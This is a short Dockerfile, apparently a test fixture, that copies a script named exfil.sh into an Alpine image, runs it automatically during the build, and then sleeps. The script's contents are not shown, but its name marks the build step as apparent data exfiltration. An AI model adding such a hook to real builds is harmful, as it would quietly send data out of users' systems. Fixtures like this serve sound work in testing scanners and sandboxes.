FROM alpine:3.20
COPY exfil.sh /exfil.sh
RUN sh /exfil.sh
CMD ["sleep","30"]
